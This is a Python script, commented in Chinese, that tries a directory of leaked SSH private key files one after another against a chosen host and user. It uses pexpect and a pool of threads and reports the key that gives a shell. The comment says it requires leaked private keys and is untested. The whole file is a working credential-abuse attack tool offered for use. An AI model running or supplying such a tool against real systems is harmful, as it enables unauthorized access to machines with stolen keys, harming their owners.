# 利用ssh的私钥登录,需要泄漏的ssh私钥文件，未做测试
import pexpect
import optparse
import os
from threading import *
from pexpect import pxssh

maxConnections=5
connection_lock=BoundedSemaphore(value=maxConnections)
Stop=False
Fails=0

def connect(user,host,keyfile,release):
    global Stop
    global Fails
    try:
        perm_denied='Permission denied'
        ssh_newkey='Are you sure you want to continue'
        conn_closed='Connection closed by remote host'
        opt= ' -o PasswordAuthentication=no'
        connStr='ssh '+user+'@'+host+' -i '+keyfile+opt
        child=pexpect.spawn(connStr)
        ret=child.expect([pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$','#',])
        # 此处指向匹配的期望值的位置下标
        if ret==2:
            print('[-] Adding Host to !/.ssh/known_hosts')
            child.sendline('yes')
            connect(user,host,keyfile,False)
        elif ret==3:
            print('[-] Connection Closed By Remote Host')
            Fails+=1
        elif ret>3:
            print('[+] Success.'+ str(keyfile))
            Stop=True
    finally:
        if release:
            connection_lock.release()
def main():
    parser=optparse.OptionParser('usage%prog -H <target host> -u <user> -d <directory>')
    parser.add_option('-H',dest='tgthost',type='string',help='specify target host')
    parser.add_option('-u',dest='user',type='string',help='specify the user')
    parser.add_option('-d',dest='passDir',type='string',help='specify the key file')
    (options,args)=parser.parse_args()
    tgthost=options.tgthost
    user=options.user
    passDir=options.passDir
    if tgthost==None or user==None or passDir==None:
        print(parser.usage)
        exit(0)
    for file in os.listdir(passDir):
        if Stop:
            print('[+] Existing : password Found')
            exit(0)
        if Fails>5:
            print('[-] Existing : too many Connections CLosed by remote host ')
            exit(0)
        connection_lock.acquire()
        fullDir=os.path.join(passDir,file)
        print('[-] Testing keyfile '+str(fullDir))
        t=Thread(target=connect,args=(user,tgthost,fullDir,True))
        child=t.start()
if __name__ == '__main__':
    main()



